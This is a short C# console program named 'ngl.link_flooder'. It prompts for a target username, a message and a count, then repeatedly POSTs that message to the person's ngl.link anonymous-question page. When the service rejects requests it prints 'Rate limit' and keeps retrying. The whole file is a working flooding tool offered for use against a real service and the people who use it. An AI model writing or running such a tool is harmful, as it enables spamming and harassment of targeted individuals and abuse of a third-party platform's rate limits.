using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Collections.Specialized;

namespace ngl.link_flooder
{
    class Program
    {
        static void Main(string[] args)
        {
            var wb = new WebClient();
            var data = new NameValueCollection();

            Console.Write("User: ");
            string user = Console.ReadLine();
            Console.Write("Text: ");
            string text = Console.ReadLine();
            Console.Write("Amount: ");
            int amt = Convert.ToInt32(Console.ReadLine());

            string url = "https://ngl.link/" + user;
            data["question"] = text;

            for(int i = 0; i <= amt;)
            {
                try
                {
                    wb.UploadValues(url, "POST", data);
                    Console.WriteLine("[+] Sending " + text + " to " + url + " " + i + " out of " + amt);
                    i++;
                }
                catch(System.Net.WebException)
                {
                    Console.WriteLine("Rate limit");
                }
            }
            Console.WriteLine("[-] Finished flood!");
            Console.ReadLine();
        }
    }
}